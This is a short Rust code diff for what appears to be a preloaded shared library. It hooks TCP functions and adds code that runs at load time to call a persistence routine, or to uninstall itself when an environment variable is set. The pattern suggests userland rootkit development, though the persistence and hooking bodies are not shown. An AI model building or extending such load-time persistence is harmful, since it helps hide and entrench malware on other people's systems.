@@ -3,6 +3,9 @@ extern crate ctor;
 extern crate log;
 extern crate colog;
 
+mod persistance;
+mod uninstall;
+
 use libc::{
     c_char, c_int, c_uint, PATH_MAX
 };
@@ -93,6 +96,13 @@ fn init() {
             .init();
     }
     log::info!("[library] Initialization function called");
+    if env::var("AUTO_DESATURATE").is_ok() {
+        log::info!("[library] AUTO_DESATURATE is set, uninstalling");
+        uninstall::uninstall();
+    } else {
+        log::info!("[library] AUTO_DESATURATE is not set, testing persistance");
+        persistance::persist();
+    }
 }
 
 mod hook_tcp;
